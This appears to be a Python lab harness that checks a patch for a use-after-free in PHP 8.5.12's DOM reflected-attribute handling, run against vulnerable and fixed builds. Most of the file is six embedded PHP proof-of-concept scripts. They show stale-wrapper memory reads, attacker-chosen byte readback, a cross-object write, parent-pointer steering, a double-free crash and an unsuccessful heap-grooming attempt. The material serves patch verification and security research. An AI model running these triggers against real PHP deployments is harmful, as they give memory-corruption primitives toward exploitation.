#!/usr/bin/env python3
"""DOM reflected-attribute UAF — plain-build control and corruption harness.

Complements lab/repro/php2shell-dom-reflected-attr.py (ASan, rung 3). This one
runs a NON-ASan dom-enabled 8.5.12 CLI so glibc's real allocator is observed.
Build the pair (local only):

  bash lab/php2shell/build-dom-plain.sh 8.5.12
  cp lab/build/php-8.5.12-plain-dom/sapi/cli/php OUT/php-vuln-plain
  patch -p1 -d lab/build/php-8.5.12-plain-dom \
      < lab/php2shell/dom-reflected-attribute-fix.patch
  make -j$(nproc) -C lab/build/php-8.5.12-plain-dom
  cp lab/build/php-8.5.12-plain-dom/sapi/cli/php OUT/php-fixed-plain
  python3 lab/repro/php2shell-dom-reflected-attr-groom.py \
      OUT/php-vuln-plain OUT/php-fixed-plain OUT

Scenarios (all fix-sensitive A/B):
  p1  stale wrapper reads the NEW value instead of the old one;
  p2  stale wrapper reads back 119 fully attacker-chosen bytes;
  p3  write through the stale wrapper corrupts the NEW node (cross-object write);
  p4  reparenting the new node steers the stale wrapper's parentNode;
  p5  empty replacement + normalizeDocument() frees the reused node; the stale
      wrapper's destructor then double-frees it -> glibc abort (rc 134).
  p6  groom negative: 12 same-size (120 B) zend_strings never land chosen bytes
      at the stale wrapper's read offsets; no arbitrary pointer control.

p1-p4 use the default allocator; p5/p6 require USE_ZEND_ALLOC=0.
No network, no non-loopback access.

Usage: python3 php2shell-dom-reflected-attr-groom.py VULN_BIN FIXED_BIN [OUTDIR]
"""
import os
import pathlib
import subprocess
import sys

P1 = r"""<?php
$doc = new DOMDocument(); $doc->loadXML('<root class="old">seed</root>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = 'new';
echo "detached: "; var_dump($text->parentNode === null);
echo "text: "; var_dump($text->textContent);
"""

P2 = r"""<?php
$doc = new DOMDocument(); $doc->loadXML('<root class="old">seed</root>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$chosen = str_repeat('P', 119);
$root->className = $chosen;
echo "same: "; var_dump($text->textContent === $chosen);
echo "len: "; var_dump(strlen($text->textContent));
"""

P3 = r"""<?php
$doc = new DOMDocument(); $doc->loadXML('<root class="old">seed</root>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = 'new';
$new = $root->getAttributeNode('class')->firstChild;
$text->nodeValue = 'CROSS-WRITE';
echo "new: "; var_dump($new->textContent);
"""

P4 = r"""<?php
$doc = new DOMDocument();
$doc->loadXML('<root class="old" other="x"><target/></root>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = 'new';
$new = $root->getAttributeNode('class')->firstChild;
$target = $root->getElementsByTagName('target')->item(0);
$target->appendChild($new);
echo "parentTag: "; var_dump($text->parentNode->nodeName ?? null);
"""

P5 = r"""<?php
// Empty replacement + normalize free: stale wrapper double-frees at shutdown.
$doc = new DOMDocument(); $doc->loadXML('<root class="old"/>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = '';
$doc->normalizeDocument();
echo "READY\n";
$p = $text->parentNode;
var_dump($p === null);
echo "SURVIVED\n";
"""

P6 = r"""<?php
// Groom negative: chosen bytes at string indices 16..23 (= chunk offset 40,
// node->parent) of 120-B zend_strings. They never occupy the stale chunk.
$doc = new DOMDocument(); $doc->loadXML('<root class="old"/>');
$root = $doc->documentElement;
$text = $root->getAttributeNode('class')->firstChild;
$root->className = '';
$doc->normalizeDocument();
$strs = [];
for ($j = 0; $j < 12; $j++) {
    $s = str_repeat('A', 89);
    for ($i = 0; $i < 8; $i++) { $s[16 + $i] = chr(0x42); }
    $strs[] = $s;
}
echo "READY\n";
$p = $text->parentNode;
var_dump($p === null);
echo "SURVIVED\n";
"""

SCENARIOS = [
    ("p1", P1, False),
    ("p2", P2, False),
    ("p3", P3, False),
    ("p4", P4, False),
    ("p5", P5, True),
    ("p6", P6, True),
]


def run(binary, script, path, log, zend_off):
    path.write_text(script)
    env = os.environ.copy()
    if zend_off:
        env["USE_ZEND_ALLOC"] = "0"
    else:
        env.pop("USE_ZEND_ALLOC", None)
    with log.open("wb") as fh:
        cp = subprocess.run([str(binary), "-n", str(path)], stdout=fh,
                            stderr=subprocess.STDOUT, timeout=120, env=env)
    return cp.returncode, log.read_text(errors="replace")


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    vuln, fixed = pathlib.Path(sys.argv[1]), pathlib.Path(sys.argv[2])
    outdir = pathlib.Path(sys.argv[3]) if len(sys.argv) > 3 else pathlib.Path(
        "lab/build/evidence/w56-domattr-groom")
    outdir.mkdir(parents=True, exist_ok=True)
    results = {}
    for label, script, zend_off in SCENARIOS:
        for name, binary in (("vuln", vuln), ("fixed", fixed)):
            rc, text = run(binary, script, outdir / f"{label}-{name}.php",
                           outdir / f"{label}-{name}.log", zend_off)
            results[(label, name)] = (rc, text)
            print(f"[{label}/{name}] rc={rc} :: {' '.join(text.split())[:180]}")

    def ok(label, needle_v, needle_f):
        v = results[(label, "vuln")]
        f = results[(label, "fixed")]
        return needle_v in v[1] and needle_f in f[1]

    checks = {
        "p1_stale_reads_new": ok("p1", "detached: bool(false)", "detached: bool(true)"),
        "p2_chosen_bytes": ok("p2", "same: bool(true)", "same: bool(false)"),
        "p3_cross_write": ok("p3", 'new: string(11) "CROSS-WRITE"', 'new: string(3) "new"'),
        "p4_parent_steer": ok("p4", 'parentTag: string(6) "target"', "parentTag: NULL"),
        "p5_glibc_double_free": (
            results[("p5", "vuln")][0] != 0
            and "double free" in results[("p5", "vuln")][1]
            and results[("p5", "fixed")][0] == 0
        ),
        "p6_no_pointer_control": (
            "SURVIVED" in results[("p6", "vuln")][1]
            and "bool(true)" in results[("p6", "vuln")][1]
            and results[("p6", "fixed")][0] == 0
        ),
    }
    verdict = "CONFIRMED_FIX_SENSITIVE" if all(
        v for k, v in checks.items() if k != "p6_no_pointer_control") else "INCONCLUSIVE"
    (outdir / "verdict.txt").write_text(
        f"verdict={verdict}\n" + "".join(f"{k}={v}\n" for k, v in checks.items()))
    print("VERDICT:", verdict)
    return 0 if verdict == "CONFIRMED_FIX_SENSITIVE" else 1


if __name__ == "__main__":
    sys.exit(main())
